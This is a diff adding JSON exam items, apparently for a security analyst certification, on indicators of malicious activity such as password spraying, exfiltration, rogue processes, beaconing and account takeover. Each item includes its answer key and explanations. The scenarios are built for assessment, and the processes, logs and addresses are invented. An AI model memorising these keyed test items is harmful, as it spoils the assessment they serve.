+          "text": "A patch server pushing approved updates to all managed endpoints overnight"
+        },
+        {
+          "id": "f",
+          "text": "A monitoring system polling its list of known servers every minute all day"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a",
+        "b"
+      ]
+    },
+    "explanation": "Sweeping a whole subnet and asking many servers for their shares are both discovery steps an intruder uses to map reachable hosts. Normal file serving, directory replication, patch distribution and scheduled monitoring are expected, repeatable traffic between known systems.",
+    "acronyms": [
+      "SMB"
+    ],
+    "searchTerm": "network enumeration host sweep"
+  },
+  {
+    "id": "cs4-1-2-mcq-029",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "mcq-multi",
+    "difficulty": 2,
+    "stem": "Which THREE observations are indicators of a suspicious or rogue process?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "A web server process starting a command shell on the host"
+        },
+        {
+          "id": "b",
+          "text": "A signed update agent running under its documented service account"
+        },
+        {
+          "id": "c",
+          "text": "A process named like a system file running from a user temp folder"
+        },
+        {
+          "id": "d",
+          "text": "A browser started by the user from the desktop shortcut after logging in"
+        },
+        {
+          "id": "e",
+          "text": "An unsigned process opening sessions to an unfamiliar address on an odd port"
+        },
+        {
+          "id": "f",
+          "text": "A backup service starting at its scheduled hour under its normal account"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a",
+        "c",
+        "e"
+      ]
+    },
+    "explanation": "A server process spawning a shell, a lookalike name in a temporary folder, and an unsigned process calling out to an unusual port are all out of character for legitimate software. A signed agent with its documented account, a user-launched browser and a scheduled backup are expected behavior.",
+    "acronyms": [],
+    "searchTerm": "suspicious process indicators"
+  },
+  {
+    "id": "cs4-1-2-mcq-030",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "mcq-multi",
+    "difficulty": 2,
+    "stem": "Which TWO observations best indicate data exfiltration?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Large outbound transfers to a personal storage site outside working hours"
+        },
+        {
+          "id": "b",
+          "text": "Nightly inbound software update downloads from the vendor update servers"
+        },
+        {
+          "id": "c",
+          "text": "A burst of DNS queries with very long encoded subdomains to one external domain"
+        },
+        {
+          "id": "d",
+          "text": "An approved copy job between two servers in the same data center"
+        },
+        {
+          "id": "e",
+          "text": "A marketing team posting scheduled articles to the company blog"
+        },
+        {
+          "id": "f",
+          "text": "A vendor portal login by an approved account during business hours"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a",
+        "c"
+      ]
+    },
+    "explanation": "Big after-hours uploads to a personal destination and encoded data hidden in DNS queries are two ways data leaves the network. Inbound updates, internal copies, scheduled publishing and ordinary vendor logins do not move sensitive data outward.",
+    "acronyms": [
+      "DNS"
+    ],
+    "searchTerm": "data exfiltration indicators"
+  },
+  {
+    "id": "cs4-1-2-mcq-031",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "mcq-multi",
+    "difficulty": 2,
+    "stem": "Which TWO events suggest an identity account may be compromised?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "A password expiry notice sent to the user on the usual schedule"
+        },
+        {
+          "id": "b",
+          "text": "A new MFA method registered minutes after a password reset from an unfamiliar country"
+        },
+        {
+          "id": "c",
+          "text": "A user's yearly access recertification marked complete by their manager"
+        },
+        {
+          "id": "d",
+          "text": "A burst of mailbox downloads at night from an address never seen for the user"
+        },
+        {
+          "id": "e",
+          "text": "A sign-in from the user's usual office address during working hours on a managed laptop"
+        },
+        {
+          "id": "f",
+          "text": "A help desk ticket about a locked screen on the user's laptop"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b",
+        "d"
+      ]
+    },
+    "explanation": "Registering a new MFA method straight after a reset from a new country, and bulk downloads at night from an unknown address, both fit an attacker who has taken over the account. The expiry notice, recertification, usual-office sign-in and help desk ticket are ordinary events.",
+    "acronyms": [
+      "MFA"
+    ],
+    "searchTerm": "IAM account compromise indicators"
+  },
+  {
+    "id": "cs4-1-2-mcq-032",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "mcq-multi",
+    "difficulty": 1,
+    "stem": "The real site is `northwind-cu.example`. Which TWO addresses are lookalike spellings meant to imitate it?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "`portal.northwind-cu.example`"
+        },
+        {
+          "id": "b",
+          "text": "`norhtwind-cu.example`"
+        },
+        {
+          "id": "c",
+          "text": "`northwind-cu.example/login`"
+        },
+        {
+          "id": "d",
+          "text": "`northwlnd-cu.example`"
+        },
+        {
+          "id": "e",
+          "text": "`mail.northwind-cu.example`"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b",
+        "d"
+      ]
+    },
+    "explanation": "Transposing two letters and swapping an i for an l both produce a different domain that a reader may take for the real one. The other three are a subdomain, a path and another subdomain of the genuine domain, so they are not misspellings.",
+    "acronyms": [],
+    "searchTerm": "typosquatting examples"
+  },
+  {
+    "id": "cs4-1-2-mcq-033",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "mcq-multi",
+    "difficulty": 3,
+    "stem": "Which THREE cloud audit findings indicate resource compromise?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "A planned autoscaling event that matches the capacity forecast approved for the launch"
+        },
+        {
+          "id": "b",
+          "text": "Compute instances launched in a region the company has never used"
+        },
+        {
+          "id": "c",
+          "text": "A scheduled snapshot of production volumes taken by the backup service"
+        },
+        {
+          "id": "d",
+          "text": "A storage policy changed to allow public reads, followed by bulk downloads"
+        },
+        {
+          "id": "e",
+          "text": "A developer signing in from the usual office with MFA on a managed laptop"
+        },
+        {
+          "id": "f",
+          "text": "A spending spike from instances created by a service identity that is normally idle"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b",
+        "d",
+        "f"
+      ]
+    },
+    "explanation": "Unused-region instances, a policy opened to the public followed by bulk downloads, and a normally idle identity creating costly workloads each show someone else using the cloud resources. Forecast autoscaling, scheduled snapshots and an expected developer sign-in are normal operations.",
+    "acronyms": [
+      "MFA"
+    ],
+    "searchTerm": "cloud resource compromise indicators"
+  },
+  {
+    "id": "cs4-1-2-data-001",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "pbq-data",
+    "difficulty": 2,
+    "pbqWeight": 4,
+    "stem": "A SOC analyst summarizes one hour of failed sign-ins from the identity provider. Use the table to answer each question.",
+    "payload": {
+      "caption": "Failed sign-ins in one hour by source address",
+      "columns": [
+        "Source address",
+        "Failed logins",
+        "Distinct accounts",
+        "Successful logins"
+      ],
+      "rows": [
+        [
+          "198.51.100.14",
+          "412",
+          "3",
+          "0"
+        ],
+        [
+          "203.0.113.77",
+          "188",
+          "94",
+          "2"
+        ],
+        [
+          "192.0.2.21",
+          "9",
+          "1",
+          "5"
+        ],
+        [
+          "10.4.8.30",
+          "36",
+          "1",
+          "1"
+        ]
+      ],
+      "chart": {
+        "kind": "bar",
+        "labelColumn": 0,
+        "valueColumn": 1
+      },
+      "fields": [
+        {
+          "id": "spray",
+          "label": "Source most consistent with password spraying",
+          "options": [
+            {
+              "id": "198.51.100.14",
+              "text": "198.51.100.14"
+            },
+            {
+              "id": "203.0.113.77",
+              "text": "203.0.113.77"
+            },
+            {
+              "id": "192.0.2.21",
+              "text": "192.0.2.21"
+            },
+            {
+              "id": "10.4.8.30",
+              "text": "10.4.8.30"
+            }
+          ]
+        },
+        {
+          "id": "guess",
+          "label": "Source most consistent with guessing the passwords of a few accounts",
+          "options": [
+            {
+              "id": "203.0.113.77",
+              "text": "203.0.113.77"
+            },
+            {
+              "id": "10.4.8.30",
+              "text": "10.4.8.30"
+            },
+            {
+              "id": "192.0.2.21",
+              "text": "192.0.2.21"
+            },
+            {
+              "id": "198.51.100.14",
+              "text": "198.51.100.14"
+            }
+          ]
+        },
+        {
+          "id": "total",
+          "label": "Total failed logins from all four sources",
+          "options": [
+            {
+              "id": "645",
+              "text": "645"
+            },
+            {
+              "id": "633",
+              "text": "633"
+            },
+            {
+              "id": "657",
+              "text": "657"
+            }
+          ]
+        },
+        {
+          "id": "avg",
+          "label": "Average failed logins per account for 203.0.113.77",
+          "options": [
+            {
+              "id": "1",
+              "text": "1"
+            },
+            {
+              "id": "4",
+              "text": "4"
+            },
+            {
+              "id": "2",
+              "text": "2"
+            }
+          ]
+        }
+      ]
+    },
+    "answer": {
+      "values": {
+        "spray": "203.0.113.77",
+        "guess": "198.51.100.14",
+        "total": "645",
+        "avg": "2"
+      }
+    },
+    "explanation": "Spraying touches many accounts with few tries each, while guessing piles many tries on a few accounts. The totals follow from adding the failed-login column and dividing by accounts.",
+    "partExplanations": {
+      "spray": "203.0.113.77 hit 94 accounts about twice each, so it stays under lockout limits.",
+      "guess": "198.51.100.14 made 412 attempts against only 3 accounts, which is heavy guessing.",
+      "total": "412 + 188 + 9 + 36 = 645.",
+      "avg": "188 failed logins divided by 94 accounts = 2 per account."
+    },
+    "acronyms": [
+      "SOC"
+    ]
+  },
+  {
+    "id": "cs4-1-2-hotspot-001",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "pbq-hotspot",
+    "difficulty": 2,
+    "pbqWeight": 6,
+    "stem": "An analyst reviews a process listing from a workstation, with each entry's parent or user shown. Select every entry that is an indicator of malicious activity.",
+    "payload": {
+      "width": 480,
+      "height": 220,
+      "nodes": [
+        {
+          "id": "n1",
+          "x": 10,
+          "y": 10,
+          "w": 220,
+          "h": 40,
+          "text": "winword.exe spawned powershell.exe -enc"
+        },
+        {
+          "id": "n2",
+          "x": 250,
+          "y": 10,
+          "w": 220,
+          "h": 40,
+          "text": "svchost.exe -k netsvcs, parent services.exe"
+        },
+        {
+          "id": "n3",
+          "x": 10,
+          "y": 90,
+          "w": 220,
+          "h": 40,
+          "text": "svch0st.exe run from C:\\Users\\Public"
+        },
+        {
+          "id": "n4",
+          "x": 250,
+          "y": 90,
+          "w": 220,
+          "h": 40,
+          "text": "chrome.exe launched by explorer.exe"
+        },
+        {
+          "id": "n5",
+          "x": 10,
+          "y": 170,
+          "w": 220,
+          "h": 40,
+          "text": "certutil.exe downloading from 203.0.113.9"
+        },
+        {
+          "id": "n6",
+          "x": 250,
+          "y": 170,
+          "w": 220,
+          "h": 40,
+          "text": "backup-agent.exe run by its service account"
+        }
+      ],
+      "spots": [
+        {
+          "id": "doc",
+          "x": 10,
+          "y": 10,
+          "w": 220,
+          "h": 40,
+          "name": "winword.exe spawned powershell.exe -enc"
+        },
+        {
+          "id": "svc",
+          "x": 250,
+          "y": 10,
+          "w": 220,
+          "h": 40,
+          "name": "svchost.exe -k netsvcs, parent services.exe"
+        },
+        {
+          "id": "fake",
+          "x": 10,
+          "y": 90,
+          "w": 220,
+          "h": 40,
+          "name": "svch0st.exe run from C:\\Users\\Public"
+        },
+        {
+          "id": "chrome",
+          "x": 250,
+          "y": 90,
+          "w": 220,
+          "h": 40,
+          "name": "chrome.exe launched by explorer.exe"
+        },
+        {
+          "id": "certutil",
+          "x": 10,
+          "y": 170,
+          "w": 220,
+          "h": 40,
+          "name": "certutil.exe downloading from 203.0.113.9"
+        },
+        {
+          "id": "backup",
+          "x": 250,
+          "y": 170,
+          "w": 220,
+          "h": 40,
+          "name": "backup-agent.exe run by its service account"
+        }
+      ]
+    },
+    "answer": {
+      "selected": [
+        "doc",
+        "fake",
+        "certutil"
+      ]
+    },
+    "explanation": "A document launching an encoded shell, a lookalike system name in a public folder, and a built-in tool used to download from an outside address are all malicious indicators. The genuine service host, the user-launched browser and the service-account backup agent are expected.",
+    "partExplanations": {
+      "doc": "An office application that starts a hidden encoded shell is a classic malicious-document pattern.",
+      "svc": "A service host launched by the service manager is normal behavior.",
+      "fake": "A digit in place of a letter, run from a public user folder, is masquerading.",
+      "chrome": "A browser started by the user from the desktop is expected.",
+      "certutil": "A built-in utility fetching a file from an outside address is living off the land.",
+      "backup": "A backup agent running under its own service account is routine."
+    },
+    "acronyms": []
+  },
+  {
+    "id": "cs4-1-2-terminal-001",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "pbq-terminal",
+    "difficulty": 3,
+    "pbqWeight": 4,
+    "stem": "A web server shows signs of a break-in. Review the log and socket output, then complete each step.",
+    "payload": {
+      "output": [
+        "$ tail -n 5 /var/log/auth.log",
+        "Nov 10 02:14:07 web-02 sshd[3121]: Failed password for invalid user admin from 203.0.113.77 port 51022 ssh2",
+        "Nov 10 02:14:09 web-02 sshd[3123]: Failed password for invalid user test from 203.0.113.77 port 51030 ssh2",
+        "Nov 10 02:14:11 web-02 sshd[3125]: Failed password for invalid user oracle from 203.0.113.77 port 51044 ssh2",
+        "Nov 10 02:14:14 web-02 sshd[3127]: Failed password for deploy from 203.0.113.77 port 51060 ssh2",
+        "Nov 10 02:14:16 web-02 sshd[3129]: Accepted password for deploy from 203.0.113.77 port 51072 ssh2",
+        "",
+        "$ ss -tlnp",
+        "State   Recv-Q  Send-Q  Local Address:Port  Peer Address:Port  Process",
+        "LISTEN  0       128     0.0.0.0:22          0.0.0.0:*          users:((\"sshd\",pid=801,fd=3))",
+        "LISTEN  0       511     0.0.0.0:443         0.0.0.0:*          users:((\"nginx\",pid=915,fd=6))",
+        "LISTEN  0       5       0.0.0.0:4444        0.0.0.0:*          users:((\"python3\",pid=4127,fd=4))",
+        "",
+        "$ grep --usage    (note: quote any search text that contains a space)",
+        "Usage: grep [options] pattern [file ...]",
+        "",
+        "$ ps --help (excerpt)",
+        "  -p, --pid <pid>   select by process id",
+        "  -f                full-format listing, includes the command line"
+      ],
+      "steps": [
+        {
+          "id": "find",
+          "label": "Type a command that prints only the lines of /var/log/auth.log that contain the text Failed password"
+        },
+        {
+          "id": "read",
+          "label": "Choose the best reading of the log lines",
+          "options": [
+            {
+              "id": "guess",
+              "text": "One source guessed passwords for several accounts, and one guess worked"
+            },
+            {
+              "id": "typo",
+              "text": "A user mistyped a password a few times before signing in"
+            },
+            {
+              "id": "rotate",
+              "text": "A log rotation job replayed old entries into the file"
+            },
+            {
+              "id": "key",
+              "text": "Key-based logins for the deploy account were refused"
+            }
+          ]
+        },
+        {
+          "id": "cmd",
+          "label": "Type a command that shows the full command line of process id 4127"
+        },
+        {
+          "id": "act",
+          "label": "Choose the best next action for the listener on port 4444",
+          "options": [
+            {
+              "id": "kill",
+              "text": "Kill process 4127 and delete its file at once"
+            },
+            {
+              "id": "iso",
+              "text": "Record the process details, then isolate the host for investigation"
+            },
+            {
+              "id": "leave",
+              "text": "Leave it, since port 4444 is above 1024 and so is allowed"
+            },
+            {
+              "id": "ssh",
+              "text": "Restart the SSH service to clear the connection"
+            }
+          ]
+        }
+      ]
+    },
+    "answer": {
+      "accept": {
+        "find": [
+          "grep \"Failed password\" /var/log/auth.log",
+          "grep -i \"Failed password\" /var/log/auth.log",
+          "grep -n \"Failed password\" /var/log/auth.log",
+          "grep -F \"Failed password\" /var/log/auth.log",
+          "grep -a \"Failed password\" /var/log/auth.log",
+          "cat /var/log/auth.log | grep \"Failed password\"",
+          "grep \"Failed password\" < /var/log/auth.log",
+          "grep 'Failed password' /var/log/auth.log",
+          "grep -i 'Failed password' /var/log/auth.log",
+          "grep -n 'Failed password' /var/log/auth.log",
+          "grep -F 'Failed password' /var/log/auth.log",
+          "grep -a 'Failed password' /var/log/auth.log",
+          "cat /var/log/auth.log | grep 'Failed password'",
+          "grep 'Failed password' < /var/log/auth.log",
+          "grep -E \"Failed password\" /var/log/auth.log",
+          "grep -E 'Failed password' /var/log/auth.log",
+          "grep -e \"Failed password\" /var/log/auth.log",
+          "grep -e 'Failed password' /var/log/auth.log",
+          "grep Failed\\ password /var/log/auth.log",
+          "grep -in \"Failed password\" /var/log/auth.log",
+          "grep -in 'Failed password' /var/log/auth.log",
+          "grep -ni \"Failed password\" /var/log/auth.log",
+          "grep -ni 'Failed password' /var/log/auth.log",
+          "cat /var/log/auth.log | grep -i \"Failed password\"",
+          "cat /var/log/auth.log | grep -i 'Failed password'",
+          "cat /var/log/auth.log | grep -F \"Failed password\"",
+          "cat /var/log/auth.log | grep -F 'Failed password'",
+          "grep --text \"Failed password\" /var/log/auth.log",
+          "grep --ignore-case \"Failed password\" /var/log/auth.log",
+          "grep --line-number \"Failed password\" /var/log/auth.log",
+          "grep --fixed-strings \"Failed password\" /var/log/auth.log",
+          "grep -F -- \"Failed password\" /var/log/auth.log",
+          "grep -- \"Failed password\" /var/log/auth.log",
+          "grep \"Failed password\" -- /var/log/auth.log"
+        ],
+        "read": [
+          "guess"
+        ],
+        "cmd": [
+          "ps -f -p 4127",
+          "ps -p 4127 -f",
+          "ps -fp 4127",
+          "ps -fp4127",
+          "ps -p4127 -f",
+          "ps -f -p4127",
+          "ps --pid 4127 -f",
+          "ps -f --pid 4127",
+          "ps --pid=4127 -f",
+          "ps -f --pid=4127"
+        ],
+        "act": [
+          "iso"
+        ]
+      }
+    },
+    "explanation": "The log shows one source trying several account names and then getting in with the deploy account, and a new listener on an unexpected port appeared from a python process. The analyst filters with grep, reads the pattern, inspects the process, then preserves evidence and isolates the host.",
+    "partExplanations": {
+      "find": "grep with the quoted text and the log path prints only the matching lines.",
+      "read": "Several account names from one address followed by a success is password guessing that worked.",
+      "cmd": "ps with -p to select the process id and -f to show the full command line.",
+      "act": "Recording the details and isolating the host contains the activity without destroying evidence."
+    },
+    "acronyms": [
+      "TCP",
+      "SSH"
+    ]
+  },
+  {
+    "id": "cs4-1-2-buckets-001",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "pbq-buckets",
+    "difficulty": 2,
+    "pbqWeight": 6,
+    "stem": "Sort each observation into the indicator category where an analyst would classify it.",
+    "payload": {
+      "buckets": [
+        {
+          "id": "net",
+          "text": "Network-related indicator"
+        },
+        {
+          "id": "host",
+          "text": "Host-related indicator"
+        },
+        {
+          "id": "cloud",
+          "text": "Cloud-related indicator"
+        },
+        {
+          "id": "idn",
+          "text": "Identity-based indicator"
+        }
+      ],
+      "items": [
+        {
+          "id": "i1",
+          "text": "Outbound session on a port the company does not use"
+        },
+        {
+          "id": "i2",
+          "text": "Unapproved scheduled task that runs a script from a temp folder"
+        },
+        {
+          "id": "i3",
+          "text": "Compute instances launched in a region the company never uses"
+        },
+        {
+          "id": "i4",
+          "text": "Sign-ins from two countries 15 minutes apart"
+        },
+        {
+          "id": "i5",
+          "text": "Unfamiliar binary holding the CPU near 100 percent"
+        },
+        {
+          "id": "i6",
+          "text": "One address probing sequential ports on a server"
+        }
+      ]
+    },
+    "answer": {
+      "placements": {
+        "i1": "net",
+        "i2": "host",
+        "i3": "cloud",
+        "i4": "idn",
+        "i5": "host",
+        "i6": "net"
+      }
+    },
+    "explanation": "Traffic and port behavior are network indicators, scheduled tasks and processes are host indicators, resources created in a provider account are cloud indicators, and where and how a user signs in is an identity indicator.",
+    "partExplanations": {
+      "i1": "An unexpected port is seen on the wire, so it is a network indicator.",
+      "i2": "A scheduled task on a machine is a host indicator.",
+      "i3": "New resources in a cloud account point to a cloud resource compromise.",
+      "i4": "Sign-in locations and timing belong to identity-based indicators.",
+      "i5": "Resource consumption by an unknown program is a host indicator.",
+      "i6": "Sequential port probing is network enumeration."
+    },
+    "acronyms": [
+      "CPU"
+    ]
+  },
+  {
+    "id": "cs4-1-2-match-001",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "pbq-match",
+    "difficulty": 2,
+    "pbqWeight": 6,
+    "stem": "Match each observation to the indicator it best represents.",
+    "payload": {
+      "prompts": [
+        {
+          "id": "p1",
+          "text": "One source sends connection attempts to many ports on a single server"
+        },
+        {
+          "id": "p2",
+          "text": "Outbound connections every 300 seconds with identical sizes to a new domain"
+        },
+        {
+          "id": "p3",
+          "text": "A link to a domain with one letter swapped for a digit"
+        },
+        {
+          "id": "p4",
+          "text": "A cloud key launches dozens of instances in an unused region"
+        },
+        {
+          "id": "p5",
+          "text": "A wire request with changed bank details from a lookalike executive address"
+        },
+        {
+          "id": "p6",
+          "text": "Sign-ins from two distant countries minutes apart"
+        }
+      ],
+      "choices": [
+        {
+          "id": "c1",
+          "text": "Network enumeration"
+        },
+        {
+          "id": "c2",
+          "text": "Beaconing"
+        },
+        {
+          "id": "c3",
+          "text": "Typosquatting"
+        },
+        {
+          "id": "c4",
+          "text": "Resource compromise"
+        },
+        {
+          "id": "c5",
+          "text": "Business email compromise"
+        },
+        {
+          "id": "c6",
+          "text": "Impossible travel"
+        },
+        {
+          "id": "c7",
+          "text": "Service disruption"
+        }
+      ]
+    },
+    "answer": {
+      "pairs": {
+        "p1": "c1",
+        "p2": "c2",
+        "p3": "c3",
+        "p4": "c4",
+        "p5": "c5",
+        "p6": "c6"
+      }
+    },
+    "explanation": "Each observation has one defining feature: port probing maps services, fixed-interval calls to a new domain are beaconing, a lookalike domain is typosquatting, unexpected cloud workloads are resource compromise, a payment change from a fake executive is BEC, and impossible geography is impossible travel. Service disruption fits none of them.",
+    "partExplanations": {
+      "p1": "Trying many ports on one server is enumeration of open services.",
+      "p2": "A fixed interval and fixed size to a new domain is beaconing.",
+      "p3": "A near-identical domain meant to be mistaken for the real one is typosquatting.",
+      "p4": "Unplanned workloads under a cloud key are resource compromise.",
+      "p5": "A payment change request from an impersonated executive is business email compromise.",
+      "p6": "Two distant locations too close in time is impossible travel."
+    },
+    "acronyms": [
+      "BEC"
+    ]
+  },
+  {
+    "id": "cs4-1-2-order-001",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "pbq-order",
+    "difficulty": 3,
+    "pbqWeight": 6,
+    "stem": "A finance user's account triggers an impossible-travel alert and may have been used for business email compromise. Order the analyst's steps. Rules: the alert is validated before anything is blocked; the account is contained before its mailbox is searched; attacker changes are reviewed before they are removed; and the user regains access last.",
+    "payload": {
+      "steps": [
+        {
+          "id": "s4",
+          "text": "The analyst reviews mailbox rules, forwarding and sent items for attacker changes"
+        },
+        {
+          "id": "s1",
+          "text": "An impossible-travel alert fires for a finance user"
+        },
+        {
+          "id": "s6",
+          "text": "The user regains access and the finance team is told to verify recent payment requests"
+        },
+        {
+          "id": "s3",
+          "text": "The analyst revokes active sessions and blocks new sign-ins for the account"
+        },
+        {
+          "id": "s5",
+          "text": "The analyst removes the malicious rules and resets the password and MFA methods"
+        },
+        {
+          "id": "s2",
+          "text": "The analyst checks sign-in details such as address, device and MFA to rule out a travel or VPN false positive"
+        }
+      ]
+    },
+    "answer": {
+      "order": [
+        "s1",
+        "s2",
+        "s3",
+        "s4",
+        "s5",
+        "s6"
+      ]
+    },
+    "explanation": "The alert is raised and validated first, the account is contained, the mailbox is reviewed to learn what the attacker changed, those changes are removed with a credential reset, and only then is access restored with finance alerted.",
+    "partExplanations": {
+      "0": "The alert starts the work.",
+      "1": "Validation comes before any blocking, so a traveling user is not locked out needlessly.",
+      "2": "Containing the account stops further attacker activity before the mailbox is searched.",
+      "3": "Reviewing the mailbox shows the scope of attacker changes before they are removed.",
+      "4": "Cleanup and credential reset follow the review so nothing is missed.",
+      "5": "Access returns last, with finance warned to check recent payment requests."
+    },
+    "acronyms": [
+      "BEC",
+      "MFA",
+      "VPN"
+    ]
+  }
+]
